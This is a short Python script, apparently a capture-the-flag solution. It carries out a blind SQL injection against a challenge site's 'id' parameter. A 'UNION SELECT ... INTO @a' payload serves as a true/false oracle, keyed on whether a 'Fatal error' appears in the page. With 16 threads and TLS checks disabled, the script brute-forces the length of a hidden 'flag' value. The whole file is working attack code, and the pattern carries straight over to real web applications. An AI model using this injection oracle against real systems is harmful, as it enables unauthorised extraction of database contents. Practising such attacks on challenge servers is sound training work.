import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings()
url = "https://04a2b0dcb17c2e99.chal.ctf.ae/"

def oracle(cond):
    s = requests.Session()
    s.verify = False
    p = f"1 UNION SELECT 2 WHERE ({cond}) INTO @a"
    try:
        r = s.get(url, params={"id": p}, timeout=10)
        return "Fatal error" not in r.text
    except Exception as e:
        return False

# Test lengths from 15 to 45
lengths = list(range(15, 46))

with ThreadPoolExecutor(max_workers=16) as ex:
    futures = {L: ex.submit(oracle, f"(SELECT LENGTH(flag) FROM flag)={L}") for L in lengths}
    for L, f in futures.items():
        if f.result():
            print(f"FOUND LENGTH: {L}")
            break
